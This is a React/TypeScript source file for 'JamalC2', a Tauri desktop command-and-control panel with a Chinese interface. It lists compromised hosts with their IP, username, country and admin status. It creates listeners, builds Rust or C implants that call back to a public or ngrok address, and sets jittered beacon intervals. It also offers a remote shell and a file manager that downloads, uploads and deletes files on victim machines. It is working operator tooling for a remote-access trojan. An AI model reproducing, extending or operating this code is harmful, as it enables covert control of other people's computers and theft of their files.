import { useState, useEffect } from "react";
import { invoke } from "@tauri-apps/api/core";
import "./App.css";

// Types
interface Client {
  id: string;
  ip_address: string;
  version: string;
  operating_system: string;
  account_type: string;
  country: string;
  username: string;
  pc_name: string;
  tag: string;
  connected_at: string;
  last_seen: string;
  beacon_interval: number;
}

interface Listener {
  id: string;
  name: string;
  bind_address: string;
  port: number;
  is_running: boolean;
  encryption_key: string;
}

interface ShellHistoryItem {
  command: string;
  output: string;
  isError: boolean;
}

function App() {
  const [clients, setClients] = useState<Client[]>([]);
  const [listeners, setListeners] = useState<Listener[]>([]);
  const [selectedClient, setSelectedClient] = useState<string | null>(null);
  const [showListenerModal, setShowListenerModal] = useState(false);
  const [showBuilderModal, setShowBuilderModal] = useState(false);
  const [showShellModal, setShowShellModal] = useState(false);
  const [showFileModal, setShowFileModal] = useState(false);
  // 持久化每个客户端的 Shell 历史
  const [shellHistory, setShellHistory] = useState<Record<string, ShellHistoryItem[]>>({});

  // 断开客户端连接
  const handleDisconnect = async () => {
    if (!selectedClient) return;

    try {
      await invoke("disconnect_client", { clientId: selectedClient });
      setSelectedClient(null);
      // 清理历史
      setShellHistory((prev) => {
        const newHistory = { ...prev };
        delete newHistory[selectedClient];
        return newHistory;
      });
      // 提示用户等待
      alert("断开连接命令已发送。\n\n客户端将在下次轮询时退出。\n请勿立即关闭服务端，否则客户端可能收不到退出命令。");
    } catch (error) {
      console.error("Failed to disconnect:", error);
    }
  };

  // Refresh clients periodically
  useEffect(() => {
    const fetchData = async () => {
      try {
        const clientList = await invoke<Client[]>("get_clients");
        setClients(clientList);
        const listenerList = await invoke<Listener[]>("get_listeners");
        setListeners(listenerList);
      } catch (error) {
        console.error("Failed to fetch data:", error);
      }
    };

    fetchData();
    const interval = setInterval(fetchData, 2000);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="app-container">
      {/* Menu Bar */}
      <div className="menu-bar">
        <div className="menu-item" onClick={() => setShowListenerModal(true)}>
          设置
        </div>
        <div className="menu-item" onClick={() => setShowBuilderModal(true)}>
          生成
        </div>
        {selectedClient && (
          <div className="menu-item" onClick={() => setShowFileModal(true)}>
            文件
          </div>
        )}
        {selectedClient && (
          <div
            className="menu-item"
            onClick={async () => {
              const input = prompt("设置心跳间隔（秒）：", "30");
              if (input) {
                const interval = parseInt(input);
                if (interval > 0) {
                  try {
                    await invoke("set_beacon_interval", {
                      clientId: selectedClient,
                      intervalSeconds: interval,
                    });
                    alert(`心跳间隔已设置为 ${interval} 秒（下次轮询后生效）`);
                  } catch (error) {
                    alert("设置失败: " + error);
                  }
                }
              }
            }}
          >
            心跳间隔
          </div>
        )}
        {selectedClient && (
          <div
            className="menu-item"
            onClick={handleDisconnect}
            style={{ marginLeft: "auto", color: "#f44336" }}
          >
            断开连接
          </div>
        )}
      </div>

      {/* Title Bar */}
      <div className="title-bar">
        <h1>🐱 JamalC2</h1>
        <span className="connection-count">已连接: {clients.length}</span>
      </div>

      {/* Main Content */}
      <div className="main-content">
        <div className="client-table-container">
          {clients.length === 0 ? (
            <div className="empty-state">
              <div className="empty-state-icon">📡</div>
              <div>暂无客户端连接</div>
              <div style={{ fontSize: "12px" }}>
                请先创建监听器并生成 Implant
              </div>
            </div>
          ) : (
            <table className="client-table">
              <thead>
                <tr>
                  <th>IP地址</th>
                  <th>标签</th>
                  <th>用户@PC</th>
                  <th>心跳间隔</th>
                  <th>状态</th>
                  <th>用户状态</th>
                  <th>国家</th>
                  <th>操作系统</th>
                  <th>帐户类型</th>
                </tr>
              </thead>
              <tbody>
                {clients.map((client) => (
                  <tr
                    key={client.id}
                    className={selectedClient === client.id ? "selected" : ""}
                    onClick={() => setSelectedClient(client.id)}
                    onDoubleClick={() => {
                      setSelectedClient(client.id);
                      setShowShellModal(true);
                    }}
                  >
                    <td>{client.ip_address}</td>
                    <td>{client.tag}</td>
                    <td>
                      {client.username}@{client.pc_name}
                    </td>
                    <td>
                      {client.beacon_interval}秒
                      {client.beacon_interval > 10 ? (
                        <span style={{ color: "#888", fontSize: "11px" }}> (±20%)</span>
                      ) : null}
                    </td>
                    <td>在线</td>
                    <td>活跃</td>
                    <td>{client.country}</td>
                    <td>{client.operating_system}</td>
                    <td>
                      <span
                        className={`badge ${client.account_type === "Admin"
                          ? "badge-admin"
                          : "badge-user"
                          }`}
                      >
                        {client.account_type}
                      </span>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>

      {/* Status Bar */}
      <div className="status-bar">
        <div className="status-indicator">
          <span
            className={`status-dot ${listeners.some((l) => l.is_running) ? "running" : ""
              }`}
          ></span>
          <span>
            监听器:{" "}
            {listeners.filter((l) => l.is_running).length > 0
              ? "运行中"
              : "关闭"}
          </span>
        </div>
        <div>
          {listeners.map((l) => (
            <span key={l.id} style={{ marginLeft: "16px" }}>
              {l.name}: {l.bind_address}:{l.port}{" "}
              {l.is_running ? "✓" : "✗"}
            </span>
          ))}
        </div>
      </div>

      {/* Listener Modal */}
      {showListenerModal && (
        <ListenerModal
          onClose={() => setShowListenerModal(false)}
          onCreated={() => {
            invoke<Listener[]>("get_listeners").then(setListeners);
          }}
          existingListener={listeners.length > 0 ? listeners[0] : null}
        />
      )}

      {/* Builder Modal */}
      {showBuilderModal && (
        <BuilderModal
          onClose={() => setShowBuilderModal(false)}
          listeners={listeners}
        />
      )}

      {/* Shell Modal */}
      {showShellModal && selectedClient && (
        <ShellModal
          clientId={selectedClient}
          onClose={() => setShowShellModal(false)}
          history={shellHistory[selectedClient] || []}
          setHistory={(newHistory) => {
            setShellHistory((prev) => ({
              ...prev,
              [selectedClient]: newHistory,
            }));
          }}
        />
      )}

      {/* File Modal */}
      {showFileModal && selectedClient && (
        <FileModal
          clientId={selectedClient}
          onClose={() => setShowFileModal(false)}
        />
      )}
    </div>
  );
}

// Listener Modal Component
function ListenerModal({
  onClose,
  onCreated,
  existingListener,
}: {
  onClose: () => void;
  onCreated: () => void;
  existingListener: Listener | null;
}) {
  const [name, setName] = useState(existingListener?.name || "HTTP Listener");
  const [bindAddress, setBindAddress] = useState(existingListener?.bind_address || "0.0.0.0");
  const [port, setPort] = useState(existingListener?.port || 4444);
  const [encryptionKey, setEncryptionKey] = useState("");
  const [loading, setLoading] = useState(false);

  // 如果已有监听器，显示查看模式
  const isViewMode = existingListener !== null;

  const handleCreate = async () => {
    if (isViewMode) {
      onClose();
      return;
    }

    // 验证密钥格式（如果提供）
    if (encryptionKey && !/^[0-9a-fA-F]{64}$/.test(encryptionKey)) {
      alert("加密密钥必须是64位十六进制字符串，或留空自动生成");
      return;
    }

    setLoading(true);
    try {
      await invoke("create_listener", {
        request: {
          name,
          bind_address: bindAddress,
          port,
          encryption_key: encryptionKey || null,
        },
      });
      // Auto-start the listener
      const listeners = await invoke<Listener[]>("get_listeners");
      if (listeners.length > 0) {
        await invoke("start_listener", { listenerId: listeners[0].id });
      }
      onCreated();
      onClose();
    } catch (error) {
      console.error("Failed to create listener:", error);
      alert("创建监听器失败: " + error);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <h2 className="modal-title">{isViewMode ? "监听器信息" : "创建监听器"}</h2>
          <button className="modal-close" onClick={onClose}>
            ×
          </button>
        </div>

        <div className="form-group">
          <label className="form-label">名称</label>
          <input
            className="form-input"
            value={name}
            onChange={(e) => setName(e.target.value)}
            disabled={isViewMode}
          />
        </div>

        <div className="form-group">
          <label className="form-label">绑定地址</label>
          <input
            className="form-input"
            value={bindAddress}
            onChange={(e) => setBindAddress(e.target.value)}
            disabled={isViewMode}
          />
        </div>

        <div className="form-group">
          <label className="form-label">端口</label>
          <input
            className="form-input"
            type="number"
            value={port}
            onChange={(e) => setPort(parseInt(e.target.value))}
            disabled={isViewMode}
          />
        </div>

        {!isViewMode && (
          <div className="form-group">
            <label className="form-label">加密密钥 (可选，留空自动生成)</label>
            <input
              className="form-input"
              value={encryptionKey}
              onChange={(e) => setEncryptionKey(e.target.value)}
              placeholder="64位十六进制字符串，或留空"
              style={{ fontSize: "12px", fontFamily: "monospace" }}
            />
          </div>
        )}

        {isViewMode && (
          <>
            <div className="form-group">
              <label className="form-label">状态</label>
              <input
                className="form-input"
                value={existingListener.is_running ? "运行中 ✅" : "已停止"}
                disabled
              />
            </div>
            <div className="form-group">
              <label className="form-label">加密密钥</label>
              <input
                className="form-input"
                value={existingListener.encryption_key}
                disabled
                style={{ fontSize: "12px", fontFamily: "monospace" }}
              />
            </div>
            <div style={{ padding: "8px 0", color: "#f59e0b", fontSize: "12px" }}>
              ⚠️ 删除监听器后需要重新生成 Implant（密钥会变化）
            </div>
          </>
        )}

        <div className="btn-group">
          <button className="btn btn-secondary" onClick={onClose}>
            {isViewMode ? "关闭" : "取消"}
          </button>
          {isViewMode && !existingListener.is_running && (
            <button
              className="btn"
              style={{ background: "#22c55e", color: "white" }}
              onClick={async () => {
                try {
                  await invoke("start_listener", { listenerId: existingListener.id });
                  onCreated();  // 刷新列表
                  onClose();
                } catch (error) {
                  alert("启动失败: " + error);
                }
              }}
            >
              启动监听器
            </button>
          )}
          {isViewMode && existingListener.is_running && (
            <button
              className="btn"
              style={{ background: "#f59e0b", color: "white" }}
              onClick={async () => {
                try {
                  await invoke("stop_listener", { listenerId: existingListener.id });
                  onCreated();  // 刷新列表
                  onClose();
                } catch (error) {
                  alert("停止失败: " + error);
                }
              }}
            >
              停止监听器
            </button>
          )}
          {isViewMode && (
            <button
              className="btn"
              style={{ background: "#ef4444", color: "white" }}
              onClick={async () => {
                if (confirm("确定要删除监听器吗？删除后需要重新生成 Implant。")) {
                  try {
                    await invoke("delete_listener", { listenerId: existingListener.id });
                    onCreated();  // 刷新列表
                    onClose();
                  } catch (error) {
                    alert("删除失败: " + error);
                  }
                }
              }}
            >
              删除并重建
            </button>
          )}
          {!isViewMode && (
            <button
              className="btn btn-primary"
              onClick={handleCreate}
              disabled={loading}
            >
              {loading ? "创建中..." : "创建并启动"}
            </button>
          )}
        </div>
      </div>
    </div>
  );
}

// Builder Modal Component
function BuilderModal({
  onClose,
  listeners,
}: {
  onClose: () => void;
  listeners: Listener[];
}) {
  // 选择的监听器
  const [selectedListenerId, setSelectedListenerId] = useState(() =>
    listeners.length > 0 ? listeners[0].id : ""
  );

  // 根据选择的监听器获取配置
  const selectedListener = listeners.find(l => l.id === selectedListenerId);

  const [serverHost, setServerHost] = useState("127.0.0.1");
  const [serverPort, setServerPort] = useState(() =>
    selectedListener ? selectedListener.port : 4444
  );
  const [useTls, setUseTls] = useState(false);
  const [tag, setTag] = useState("default");
  const [outputName, setOutputName] = useState("implant");
  const [skipKeyCheck, setSkipKeyCheck] = useState(false);
  const [implantType, setImplantType] = useState<"rust" | "c">("rust");
  const [loading, setLoading] = useState(false);
  const [result, setResult] = useState<string | null>(null);

  // 当选择的监听器改变时，更新端口
  const handleListenerChange = (listenerId: string) => {
    setSelectedListenerId(listenerId);
    const listener = listeners.find(l => l.id === listenerId);
    if (listener) {
      setServerPort(listener.port);
    }
  };

  const handleBuild = async () => {
    if (!selectedListener) {
      setResult("✗ 请先选择一个监听器");
      return;
    }

    setLoading(true);
    setResult(null);
    try {
      const res = await invoke<{
        success: boolean;
        output_path?: string;
        error?: string;
      }>("build_implant", {
        request: {
          server_host: serverHost,
          server_port: serverPort,
          use_tls: useTls,
          tag,
          output_name: outputName,
          encryption_key: selectedListener.encryption_key,
          skip_key_check: skipKeyCheck,
          implant_type: implantType,
        },
      });

      if (res.success && res.output_path) {
        setResult(`✓ 生成成功: ${res.output_path}`);
      } else {
        setResult(`✗ 生成失败: ${res.error}`);
      }
    } catch (error) {
      setResult(`✗ 错误: ${error}`);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div className="modal" onClick={(e) => e.stopPropagation()}>
        <div className="modal-header">
          <h2 className="modal-title">生成 Implant</h2>
          <button className="modal-close" onClick={onClose}>
            ×
          </button>
        </div>

        <div className="form-group">
          <label className="form-label">选择监听器</label>
          <select
            className="form-input"
            value={selectedListenerId}
            onChange={(e) => handleListenerChange(e.target.value)}
          >
            {listeners.length === 0 ? (
              <option value="">请先创建监听器</option>
            ) : (
              listeners.map((l) => (
                <option key={l.id} value={l.id}>
                  {l.name} ({l.bind_address}:{l.port})
                </option>
              ))
            )}
          </select>
        </div>

        <div className="form-group">
          <label className="form-label">Implant 类型</label>
          <div style={{ display: "flex", gap: "20px", padding: "8px 0" }}>
            <label className="form-checkbox">
              <input
                type="radio"
                name="implantType"
                checked={implantType === "rust"}
                onChange={() => setImplantType("rust")}
              />
              Rust (推荐)
            </label>
            <label className="form-checkbox">
              <input
                type="radio"
                name="implantType"
                checked={implantType === "c"}
                onChange={() => setImplantType("c")}
              />
              C (需要 MSVC)
            </label>
          </div>
        </div>

        <div className="form-group">
          <label className="form-label">服务器地址</label>
          <input
            className="form-input"
            value={serverHost}
            onChange={(e) => setServerHost(e.target.value)}
            placeholder="IP 或域名（通常填写公网地址或 ngrok 地址）"
          />
        </div>

        <div className="form-group">
          <label className="form-label">端口</label>
          <input
            className="form-input"
            type="number"
            value={serverPort}
            onChange={(e) => setServerPort(parseInt(e.target.value))}
          />
        </div>

        <div className="form-group">
          <label className="form-checkbox">
            <input
              type="checkbox"
              checked={useTls}
              onChange={(e) => setUseTls(e.target.checked)}
            />
            使用 HTTPS/WSS
          </label>
          <label className="form-checkbox" style={{ marginLeft: '20px' }}>
            <input
              type="checkbox"
              checked={skipKeyCheck}
              onChange={(e) => setSkipKeyCheck(e.target.checked)}
            />
            无需启动参数
          </label>
        </div>

        <div className="form-group">
          <label className="form-label">标签</label>
          <input
            className="form-input"
            value={tag}
            onChange={(e) => setTag(e.target.value)}
          />
        </div>

        <div className="form-group">
          <label className="form-label">输出文件名</label>
          <input
            className="form-input"
            value={outputName}
            onChange={(e) => setOutputName(e.target.value)}
          />
        </div>

        {result && (
          <div
            style={{
              padding: "12px",
              background: result.startsWith("✓")
                ? "rgba(76, 175, 80, 0.2)"
                : "rgba(244, 67, 54, 0.2)",
              borderRadius: "4px",
              marginBottom: "16px",
            }}
          >
            {result}
          </div>
        )}

        <div className="btn-group">
          <button className="btn btn-secondary" onClick={onClose}>
            关闭
          </button>
          <button
            className="btn btn-primary"
            onClick={handleBuild}
            disabled={loading}
          >
            {loading ? "生成中..." : "生成"}
          </button>
        </div>
      </div>
    </div>
  );
}

// Shell Modal Component
function ShellModal({
  clientId,
  onClose,
  history,
  setHistory,
}: {
  clientId: string;
  onClose: () => void;
  history: ShellHistoryItem[];
  setHistory: (newHistory: ShellHistoryItem[]) => void;
}) {
  const [command, setCommand] = useState("");
  const [isFullscreen, setIsFullscreen] = useState(false);

  // 轮询获取 Shell 响应
  useEffect(() => {
    const fetchResponses = async () => {
      try {
        const responses = await invoke<{ output: string; is_error: boolean; timestamp: number }[]>(
          "get_shell_responses",
          { clientId }
        );

        if (responses.length > 0) {
          setHistory(
            history.map((item) => {
              if (item.output === "[等待响应...]") {
                const resp = responses.shift();
                return resp
                  ? { ...item, output: resp.output, isError: resp.is_error }
                  : item;
              }
              return item;
            }).concat(
              responses.map((resp) => ({
                command: "[服务器推送]",
                output: resp.output,
                isError: resp.is_error,
              }))
            )
          );
        }
      } catch (error) {
        console.error("Failed to fetch shell responses:", error);
      }
    };

    const interval = setInterval(fetchResponses, 500);
    return () => clearInterval(interval);
  }, [clientId, history, setHistory]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!command.trim()) return;

    try {
      await invoke("send_shell_command", { clientId, command });
      setHistory([
        ...history,
        { command, output: "[等待响应...]", isError: false },
      ]);
      setCommand("");
    } catch (error) {
      setHistory([
        ...history,
        { command, output: `Error: ${error}`, isError: true },
      ]);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div
        className="modal"
        onClick={(e) => e.stopPropagation()}
        style={isFullscreen
          ? { width: "100vw", height: "100vh", maxWidth: "100vw", borderRadius: 0 }
          : { minWidth: "800px", maxWidth: "90vw" }
        }
      >
        <div className="modal-header">
          <h2 className="modal-title">远程 Shell - {clientId.slice(0, 8)}...</h2>
          <div style={{ display: "flex", gap: "8px" }}>
            <button
              className="modal-close"
              onClick={() => setIsFullscreen(!isFullscreen)}
              title={isFullscreen ? "退出全屏" : "全屏"}
            >
              {isFullscreen ? "⊡" : "⊞"}
            </button>
            <button className="modal-close" onClick={onClose}>
              ×
            </button>
          </div>
        </div>

        <div
          className="shell-console"
          style={{ height: isFullscreen ? "calc(100vh - 150px)" : "400px" }}
        >
          {history.map((item, i) => (
            <div key={i}>
              <div style={{ color: "#4a9eff" }}>&gt; {item.command}</div>
              <div className={item.isError ? "shell-error" : "shell-output"}>
                {item.output}
              </div>
            </div>
          ))}
        </div>

        <form onSubmit={handleSubmit} className="shell-input-container">
          <span className="shell-prompt">&gt;</span>
          <input
            className="shell-input"
            value={command}
            onChange={(e) => setCommand(e.target.value)}
            placeholder="输入命令..."
            autoFocus
          />
        </form>

        <div className="btn-group">
          <button
            className="btn btn-secondary"
            onClick={() => setHistory([])}
            type="button"
          >
            清空
          </button>
          <button className="btn btn-secondary" onClick={onClose} type="button">
            关闭
          </button>
        </div>
      </div>
    </div>
  );
}

// File Modal Types
interface FileEntry {
  name: string;
  path: string;
  is_dir: boolean;
  size: number;
  modified: number;
}

interface FileResponseData {
  type: string;
  path?: string;
  entries?: FileEntry[];
  data?: number[];
  success?: boolean;
  error?: string;
}

// File Modal Component
function FileModal({
  clientId,
  onClose,
}: {
  clientId: string;
  onClose: () => void;
}) {
  const [currentPath, setCurrentPath] = useState("");
  const [entries, setEntries] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [isFullscreen, setIsFullscreen] = useState(false);
  const [downloadStatus, setDownloadStatus] = useState<string | null>(null);

  // 加载目录
  const loadDirectory = async (path: string) => {
    setLoading(true);
    setError(null);
    try {
      await invoke("get_directory_listing", { clientId, path });
      setCurrentPath(path);
    } catch (e) {
      setError(`加载失败: ${e}`);
    }
  };

  // 轮询获取文件响应
  useEffect(() => {
    const fetchResponses = async () => {
      try {
        const responses = await invoke<FileResponseData[]>("get_file_responses", { clientId });
        for (const resp of responses) {
          if (resp.type === "DirectoryListing") {
            setEntries(resp.entries || []);
            setLoading(false);
            if (resp.error) setError(resp.error);
          } else if (resp.type === "FileDownload") {
            if (resp.error) {
              alert(`下载失败: ${resp.error}`);
            } else if (resp.data && resp.data.length > 0) {
              // 使用 Tauri 的保存对话框
              try {
                const { save } = await import("@tauri-apps/plugin-dialog");
                const { writeFile } = await import("@tauri-apps/plugin-fs");

                const fileName = resp.path?.split(/[/\\]/).pop() || "download";

                // 打开保存对话框
                const savePath = await save({
                  defaultPath: fileName,
                  filters: [{ name: "All Files", extensions: ["*"] }],
                });

                if (savePath) {
                  // 保存文件
                  await writeFile(savePath, new Uint8Array(resp.data));
                  setDownloadStatus(`✅ 已下载: ${savePath} (${resp.data.length} 字节)`);
                  setTimeout(() => setDownloadStatus(null), 5000);
                }
              } catch (e) {
                alert(`保存文件失败: ${e}`);
              }
            }
          } else if (resp.type === "FileDelete") {
            if (resp.success) {
              loadDirectory(currentPath);
            } else {
              alert(`删除失败: ${resp.error}`);
            }
          } else if (resp.type === "FileUpload") {
            if (resp.success) {
              alert(`上传成功: ${resp.path}`);
              loadDirectory(currentPath);
            } else {
              alert(`上传失败: ${resp.error}`);
            }
          }
        }
      } catch (e) {
        console.error("Failed to fetch file responses:", e);
      }
    };

    const interval = setInterval(fetchResponses, 500);
    return () => clearInterval(interval);
  }, [clientId, currentPath]);

  // 初始加载
  useEffect(() => {
    loadDirectory("");
  }, [clientId]);

  // 格式化文件大小
  const formatSize = (bytes: number) => {
    if (bytes === 0) return "-";
    const k = 1024;
    const sizes = ["B", "KB", "MB", "GB"];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + " " + sizes[i];
  };

  // 返回上级目录
  const goUp = () => {
    if (!currentPath) return;

    // 统一使用反斜杠（Windows 路径）
    const normalizedPath = currentPath.replace(/\//g, "\\").replace(/\\+$/, ""); // 移除末尾斜杠
    const parts = normalizedPath.split("\\").filter(p => p.length > 0);

    if (parts.length <= 1) {
      // 已经在驱动器根目录，返回驱动器列表
      loadDirectory("");
    } else {
      // 移除最后一个部分
      parts.pop();
      if (parts.length === 1 && parts[0].endsWith(":")) {
        loadDirectory(parts[0] + "\\");
      } else {
        loadDirectory(parts.join("\\"));
      }
    }
  };

  // 处理项目点击
  const handleItemClick = (entry: FileEntry) => {
    if (entry.is_dir) {
      loadDirectory(entry.path);
    }
  };

  // 删除文件
  const handleDelete = async (entry: FileEntry) => {
    if (!confirm(`确定删除 ${entry.name}?`)) return;
    try {
      await invoke("delete_file", { clientId, path: entry.path });
    } catch (e) {
      alert(`删除失败: ${e}`);
    }
  };

  // 下载文件
  const handleDownload = async (entry: FileEntry) => {
    try {
      await invoke("download_file", { clientId, path: entry.path });
    } catch (e) {
      alert(`下载失败: ${e}`);
    }
  };

  return (
    <div className="modal-overlay" onClick={onClose}>
      <div
        className="modal"
        onClick={(e) => e.stopPropagation()}
        style={isFullscreen
          ? { width: "100vw", height: "100vh", maxWidth: "100vw", borderRadius: 0 }
          : { minWidth: "800px", maxWidth: "90vw" }
        }
      >
        <div className="modal-header">
          <h2 className="modal-title">📁 文件管理 - {clientId.slice(0, 8)}...</h2>
          <div style={{ display: "flex", gap: "8px" }}>
            <button
              className="modal-close"
              onClick={() => setIsFullscreen(!isFullscreen)}
              title={isFullscreen ? "退出全屏" : "全屏"}
            >
              {isFullscreen ? "⊡" : "⊞"}
            </button>
            <button className="modal-close" onClick={onClose}>×</button>
          </div>
        </div>

        {/* 路径栏 */}
        <div style={{ padding: "8px 16px", background: "rgba(0,0,0,0.2)", display: "flex", gap: "8px", alignItems: "center" }}>
          <button
            className="btn btn-secondary"
            onClick={goUp}
            disabled={!currentPath}
            style={{ padding: "4px 12px" }}
          >
            ⬆ 上级
          </button>
          <button
            className="btn btn-secondary"
            onClick={() => loadDirectory(currentPath)}
            style={{ padding: "4px 12px" }}
          >
            🔄 刷新
          </button>
          <label
            className="btn btn-secondary"
            style={{ padding: "4px 12px", cursor: "pointer" }}
          >
            📤 上传
            <input
              type="file"
              style={{ display: "none" }}
              onChange={async (e) => {
                const file = e.target.files?.[0];
                if (!file) return;
                const reader = new FileReader();
                reader.onload = async () => {
                  const data = new Uint8Array(reader.result as ArrayBuffer);
                  // 使用反斜杠（Windows 路径格式）
                  const targetPath = currentPath
                    ? `${currentPath}\\${file.name}`.replace(/\//g, "\\")
                    : file.name;
                  try {
                    await invoke("upload_file", {
                      clientId,
                      path: targetPath,
                      fileData: Array.from(data),
                    });
                    // 上传成功/失败会在响应处理中显示
                  } catch (err) {
                    alert(`发送上传命令失败: ${err}`);
                  }
                };
                reader.readAsArrayBuffer(file);
                e.target.value = "";
              }}
            />
          </label>
          <span style={{ flex: 1, padding: "4px 8px", background: "rgba(0,0,0,0.3)", borderRadius: "4px" }}>
            {currentPath || "(根目录)"}
          </span>
          {downloadStatus && (
            <span style={{ color: "#4caf50", fontSize: "12px" }}>{downloadStatus}</span>
          )}
        </div>

        {/* 文件列表 */}
        <div
          style={{
            height: isFullscreen ? "calc(100vh - 180px)" : "400px",
            overflow: "auto",
            padding: "8px",
          }}
        >
          {loading ? (
            <div style={{ textAlign: "center", padding: "40px", color: "#888" }}>加载中...</div>
          ) : error ? (
            <div style={{ textAlign: "center", padding: "40px", color: "#f44336" }}>{error}</div>
          ) : entries.length === 0 ? (
            <div style={{ textAlign: "center", padding: "40px", color: "#888" }}>空目录</div>
          ) : (
            <table className="client-table" style={{ width: "100%" }}>
              <thead>
                <tr>
                  <th>名称</th>
                  <th>大小</th>
                  <th>操作</th>
                </tr>
              </thead>
              <tbody>
                {entries.map((entry, i) => (
                  <tr
                    key={i}
                    onDoubleClick={() => handleItemClick(entry)}
                    style={{ cursor: entry.is_dir ? "pointer" : "default" }}
                  >
                    <td>
                      <span style={{ marginRight: "8px" }}>{entry.is_dir ? "📁" : "📄"}</span>
                      {entry.name}
                    </td>
                    <td>{formatSize(entry.size)}</td>
                    <td>
                      {!entry.is_dir && (
                        <button
                          className="btn btn-secondary"
                          onClick={() => handleDownload(entry)}
                          style={{ padding: "2px 8px", marginRight: "4px", fontSize: "12px" }}
                        >
                          下载
                        </button>
                      )}
                      <button
                        className="btn btn-secondary"
                        onClick={() => handleDelete(entry)}
                        style={{ padding: "2px 8px", fontSize: "12px", color: "#f44336" }}
                      >
                        删除
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>

        <div className="btn-group">
          <button className="btn btn-secondary" onClick={onClose} type="button">
            关闭
          </button>
        </div>
      </div>
    </div>
  );
}

export default App;

